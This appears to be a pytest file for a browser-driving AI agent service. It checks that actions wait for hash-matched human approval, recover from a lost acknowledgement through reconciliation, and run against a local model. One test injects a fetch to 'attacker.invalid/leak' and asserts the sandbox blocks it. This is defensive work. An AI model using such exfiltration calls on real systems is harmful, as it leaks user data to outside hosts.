"""Actual Chromium forms, lost acknowledgements and optional installed-Ollama proof."""

from __future__ import annotations

import json
import shutil
import time
import uuid
from typing import Any

import httpx
import pytest
from fw_agent.contracts import Draft

from fw_core.settings import AgentAppSettings

from .conftest import ROOT, wait_state
from .test_boundary import headers


@pytest.mark.browser
async def test_browser_exact_action_and_lost_acknowledgement(
    agent_server: tuple[Any, httpx.AsyncClient], agent_settings: AgentAppSettings, monkeypatch: pytest.MonkeyPatch
) -> None:
    app, client = agent_server
    runner = app.state.runner
    mutation = await headers(client, agent_settings.agent.allowed_origins[0])

    async def draft(*_: Any) -> Draft:
        return Draft(title="Inspect DEMO-14", body="Investigate the refrigeration temperature warning.")

    monkeypatch.setattr(runner.model, "draft", draft)
    task_id = (
        await client.post(
            "/api/tasks",
            headers=mutation,
            json={
                "template_id": "maintenance_request",
                "origin": agent_settings.agent.allowed_origins[0],
                "request": "Draft a maintenance request.",
            },
        )
    ).json()["task_id"]
    task = await wait_state(client, task_id, {"AWAITING_APPROVAL", "FAILED"})
    assert task["state"] == "AWAITING_APPROVAL", task
    assert "DEMO-14" in task["proposal"]["source"]
    assert app.state.store.receipt(task_id) is None
    assert (
        await client.post(f"/api/tasks/{task_id}/approve", headers=mutation, json={"hash": "0" * 64})
    ).status_code == 409
    original_execute = runner.browser.execute

    async def lose_ack(*args: Any, **kwargs: Any) -> dict[str, Any]:
        await original_execute(*args, **kwargs)
        raise TimeoutError("destination committed, acknowledgement deliberately lost")

    monkeypatch.setattr(runner.browser, "execute", lose_ack)
    assert (
        await client.post(f"/api/tasks/{task_id}/approve", headers=mutation, json={"hash": task["hash"]})
    ).status_code == 202
    unknown = await wait_state(client, task_id, {"UNKNOWN", "CONFIRMED"})
    assert unknown["state"] == "UNKNOWN", unknown
    assert app.state.store.receipt(task_id) is not None
    assert (
        await client.post(f"/api/tasks/{task_id}/approve", headers=mutation, json={"hash": task["hash"]})
    ).status_code == 409
    reconciled = await client.post(f"/api/tasks/{task_id}/reconcile", headers=mutation, json={})
    assert reconciled.status_code == 200, reconciled.text
    assert reconciled.json()["state"] == "CONFIRMED"
    assert app.state.store.db.execute("SELECT count(*) FROM receipts").fetchone()[0] == 1
    assert (await client.get(f"/api/tasks/{task_id}/evidence")).status_code == 200
    assert (agent_settings.agent.evidence_directory / f"{task_id}.png").stat().st_size > 0
    assert not runner.browser.pages


@pytest.mark.browser
async def test_browser_blocks_mutations_before_approval_and_other_origins(
    agent_server: tuple[Any, httpx.AsyncClient],
    agent_settings: AgentAppSettings,
) -> None:
    app, _ = agent_server
    browser = app.state.runner.browser
    destination = agent_settings.agent.allowed_origins[0]
    async with browser.tabs(destination) as pages:
        page = pages[0]
        await page.goto(destination + "/lab/maintenance_request/source")
        result = await page.evaluate("""async () => {
          try { await fetch('/lab/maintenance_request/accept', {method:'POST', body:'{}'}); return 'sent'; }
          catch { return 'blocked'; }
        }""")
        assert result == "blocked"
        result = await page.evaluate("""async () => {
          try { await fetch('https://attacker.invalid/leak'); return 'sent'; }
          catch { return 'blocked'; }
        }""")
        assert result == "blocked"
        assert len(browser.pages) == 2
    assert not browser.pages
    assert app.state.store.db.execute("SELECT count(*) FROM receipts").fetchone()[0] == 0


@pytest.mark.browser
@pytest.mark.slow
async def test_three_installed_local_model_templates(
    agent_server: tuple[Any, httpx.AsyncClient], agent_settings: AgentAppSettings, request: pytest.FixtureRequest
) -> None:
    if not request.config.getoption("--agent-model-proof"):
        pytest.skip("opt in with --agent-model-proof; CI has no installed local model")
    app, client = agent_server
    mutation = await headers(client, agent_settings.agent.allowed_origins[0])
    output = ROOT / "var" / "agent-proof" / uuid.uuid4().hex
    output.mkdir(parents=True)
    start = time.monotonic()
    records = []
    for template in app.state.runner.data.templates:
        response = await client.post(
            "/api/tasks",
            headers=mutation,
            json={
                "template_id": template.id,
                "origin": agent_settings.agent.allowed_origins[0],
                "request": template.description,
            },
        )
        assert response.status_code == 202, response.text
        task_id = response.json()["task_id"]
        task = await wait_state(client, task_id, {"AWAITING_APPROVAL", "FAILED"}, seconds=180)
        assert task["state"] == "AWAITING_APPROVAL", task
        assert app.state.store.receipt(task_id) is None
        response = await client.post(f"/api/tasks/{task_id}/approve", headers=mutation, json={"hash": task["hash"]})
        assert response.status_code == 202, response.text
        result = await wait_state(client, task_id, {"CONFIRMED", "UNKNOWN"}, seconds=60)
        assert result["state"] == "CONFIRMED", result
        records.append(result)
        for suffix in (".json", ".png"):
            shutil.copyfile(
                agent_settings.agent.evidence_directory / f"{task_id}{suffix}", output / f"{task_id}{suffix}"
            )
    (output / "verification.json").write_text(
        json.dumps(
            {
                "model": agent_settings.agent.model_id,
                "duration_s": time.monotonic() - start,
                "flows": records,
                "receipts": len(records),
                "real_browser": True,
                "real_local_model": True,
                "paid_inference": False,
            },
            indent=2,
        ),
        encoding="utf-8",
    )
    assert len(records) == 3
    assert app.state.store.db.execute("SELECT count(*) FROM receipts").fetchone()[0] == 3
    print(f"Agent real-model/browser evidence: {output}")
